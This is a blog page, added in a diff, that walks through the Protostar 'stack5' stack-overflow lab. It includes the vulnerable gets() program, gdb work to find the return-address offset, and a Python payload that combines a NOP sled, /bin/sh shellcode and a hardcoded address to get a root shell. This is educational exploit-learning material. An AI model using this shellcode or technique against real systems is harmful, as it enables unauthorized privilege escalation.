@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang=en>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="Here is the source of the vulnerable program : 1234567891011#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;int main(int argc, char **argv)&amp;#123;  ch">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Protostar vm, stack5">
+<meta property="og:url" content="http://slayne.github.io/2016/02/03/stack5/index.html">
+<meta property="og:site_name" content="The Hacker Apprentice">
+<meta property="og:description" content="Here is the source of the vulnerable program : 1234567891011#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;int main(int argc, char **argv)&amp;#123;  ch">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-05-19T14:09:56.541Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Protostar vm, stack5">
+<meta name="twitter:description" content="Here is the source of the vulnerable program : 1234567891011#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;int main(int argc, char **argv)&amp;#123;  ch">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Protostar vm, stack5</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2016/02/16/stack6/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2016/02/02/stack4/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://slayne.github.io/2016/02/03/stack5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://slayne.github.io/2016/02/03/stack5/&text=Protostar vm, stack5"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://slayne.github.io/2016/02/03/stack5/&title=Protostar vm, stack5"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://slayne.github.io/2016/02/03/stack5/&is_video=false&description=Protostar vm, stack5"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Protostar vm, stack5&body=Check out this article: http://slayne.github.io/2016/02/03/stack5/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://slayne.github.io/2016/02/03/stack5/&title=Protostar vm, stack5"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://slayne.github.io/2016/02/03/stack5/&title=Protostar vm, stack5"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://slayne.github.io/2016/02/03/stack5/&title=Protostar vm, stack5"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://slayne.github.io/2016/02/03/stack5/&title=Protostar vm, stack5"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://slayne.github.io/2016/02/03/stack5/&name=Protostar vm, stack5&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Protostar vm, stack5
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">The Hacker Apprentice</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2016-02-02T23:00:00.000Z" itemprop="datePublished">03-02-2016</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/protostar/">protostar</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>Here is the source of the vulnerable program :</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>This time, we have to execute a buffer overflow and execute shellcode.</p>
+<p>Basically I’ll try the same trick but instead of a random padding I’ll  put the shellcode in the buffer.</p>
+<p>Here is what the payload will look like :</p>
+<p>nop padding + shellcode + address of shellcode</p>
+<p>So first, let’s get the offset of the <b>%eip</b> register :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:/opt/protostar/bin$ gdb -q stack5</span><br><span class="line">Reading symbols from /opt/protostar/bin/stack5...done.</span><br><span class="line">(gdb) disass main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">0x080483c4 &lt;main+0&gt;:	push   %ebp</span><br><span class="line">0x080483c5 &lt;main+1&gt;:	mov    %esp,%ebp</span><br><span class="line">0x080483c7 &lt;main+3&gt;:	and    <span class="variable">$0xfffffff0</span>,%esp</span><br><span class="line">0x080483ca &lt;main+6&gt;:	sub    <span class="variable">$0x50</span>,%esp</span><br><span class="line">0x080483cd &lt;main+9&gt;:	lea    0x10(%esp),%eax</span><br><span class="line">0x080483d1 &lt;main+13&gt;:	mov    %eax,(%esp)</span><br><span class="line">0x080483d4 &lt;main+16&gt;:	call   0x80482e8 &lt;gets@plt&gt;</span><br><span class="line">0x080483d9 &lt;main+21&gt;:	leave  </span><br><span class="line">0x080483da &lt;main+22&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) <span class="built_in">break</span> main</span><br><span class="line">Breakpoint 1 at 0x80483cd: file stack5/stack5.c, line 10.</span><br><span class="line">(gdb) <span class="built_in">break</span> *main+21</span><br><span class="line">Breakpoint 2 at 0x80483d9: file stack5/stack5.c, line 11.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /opt/protostar/bin/stack5 </span><br><span class="line"></span><br><span class="line">Breakpoint 1, main (argc=1, argv=0xbffff874) at stack5/stack5.c:10</span><br><span class="line">10	stack5/stack5.c: No such file or directory.</span><br><span class="line">	<span class="keyword">in</span> stack5/stack5.c</span><br><span class="line">(gdb) i r</span><br><span class="line">eax            0xbffff874	-1073743756</span><br><span class="line">ecx            0x66e21e45	1726094917</span><br><span class="line">edx            0x1	1</span><br><span class="line">ebx            0xb7fd7ff4	-1208123404</span><br><span class="line">esp            0xbffff770	0xbffff770</span><br><span class="line">ebp            0xbffff7c8	0xbffff7c8</span><br><span class="line">esi            0x0	0</span><br><span class="line">edi            0x0	0</span><br><span class="line">eip            0x80483cd	0x80483cd &lt;main+9&gt;</span><br><span class="line">eflags         0x200282	[ SF IF ID ]</span><br><span class="line">cs             0x73	115</span><br><span class="line">ss             0x7b	123</span><br><span class="line">ds             0x7b	123</span><br><span class="line">es             0x7b	123</span><br><span class="line">fs             0x0	0</span><br><span class="line">gs             0x33	51</span><br><span class="line">(gdb) x/x <span class="variable">$esp</span></span><br><span class="line">0xbffff770:	0xb7fd7ff4</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">AAAAAAAAAAAAAAAAAAAA</span><br><span class="line"></span><br><span class="line">Breakpoint 2, main (argc=1, argv=0xbffff874) at stack5/stack5.c:11</span><br><span class="line">11	<span class="keyword">in</span> stack5/stack5.c</span><br><span class="line">(gdb) x/x <span class="variable">$esp</span></span><br><span class="line">0xbffff770:	0xbffff780</span><br><span class="line">(gdb) i r <span class="variable">$ebp</span></span><br><span class="line">ebp            0xbffff7c8	0xbffff7c8</span><br><span class="line">(gdb) p <span class="variable">$ebp</span> +0x4 - 0xbffff780</span><br><span class="line"><span class="variable">$1</span> = (void *) 0x4c</span><br><span class="line">(gdb) p 0x4c</span><br><span class="line"><span class="variable">$2</span> = 76</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
+<p>I’m placing two breakpoints here but only one is necessary : the one after the call to gets.<br>After the program hits the breakpoint, I need to check both <b>%esp</b> and <b>%ebp</b> registers in order to get the offset.</p>
+<p>The offset of the <b>%eip</b> register is of 76b.</p>
+<p>We also need to know where the buffer is being written. </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/30x <span class="variable">$esp</span></span><br><span class="line">0xbffff770:	0xbffff780	0xb7ec6165	0xbffff788	0xb7eada75</span><br><span class="line">0xbffff780:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0xbffff790:	0x41414141	0x08049500	0xbffff7c8	0x08048409</span><br><span class="line">0xbffff7a0:	0xb7fd8304	0xb7fd7ff4	0x080483f0	0xbffff7c8</span><br><span class="line">0xbffff7b0:	0xb7ec6365	0xb7ff1040	0x080483fb	0xb7fd7ff4</span><br><span class="line">0xbffff7c0:	0x080483f0	0x00000000	0xbffff848	0xb7eadc76</span><br><span class="line">0xbffff7d0:	0x00000001	0xbffff874	0xbffff87c	0xb7fe1848</span><br><span class="line">0xbffff7e0:	0xbffff830	0xffffffff</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
+<p>So the buffer starts to get written at 0xbffff780. Since we have the NOP padding, I’ll put 0xbffff784 in %eip .</p>
+<p>Now is the part where I should write the shellcode, but since I’m not able to do that yet I used <a href="http://www.tenouk.com/Bufferoverflowc/Bufferoverflow5.html" target="_blank" rel="noopener">this</a>.</p>
+<p>Let’s build the payload with that :</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">nop=<span class="string">"\x90"</span></span><br><span class="line">shellcode=<span class="string">"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"</span></span><br><span class="line"></span><br><span class="line">payload=(<span class="number">76</span>-len(shellcode))*nop+shellcode+<span class="string">"\x84\xf7\xff\xbf"</span></span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
+<p>We’re almost done, let’s test the code :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:~$ python pls.py | /opt/protostar/bin/./stack5</span><br><span class="line">user@protostar:~$</span><br></pre></td></tr></table></figure>
+<p>Annnnnd nothing. </p>
+<p>After searching the web for answers, I used <a href="http://www.tenouk.com/Bufferoverflowc/Bufferoverflow5.html" target="_blank" rel="noopener">this</a> solution.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:~$ python pls.py &gt; payload </span><br><span class="line">user@protostar:~$ (cat payload ;cat) | /opt/protostar/bin/./stack5</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">ls</span><br><span class="line">payload  pls.py  sh  sh.c  <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://slayne.github.io/2016/02/03/stack5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://slayne.github.io/2016/02/03/stack5/&text=Protostar vm, stack5"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://slayne.github.io/2016/02/03/stack5/&title=Protostar vm, stack5"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://slayne.github.io/2016/02/03/stack5/&is_video=false&description=Protostar vm, stack5"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Protostar vm, stack5&body=Check out this article: http://slayne.github.io/2016/02/03/stack5/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://slayne.github.io/2016/02/03/stack5/&title=Protostar vm, stack5"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://slayne.github.io/2016/02/03/stack5/&title=Protostar vm, stack5"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://slayne.github.io/2016/02/03/stack5/&title=Protostar vm, stack5"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://slayne.github.io/2016/02/03/stack5/&title=Protostar vm, stack5"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://slayne.github.io/2016/02/03/stack5/&name=Protostar vm, stack5&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 slayne
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
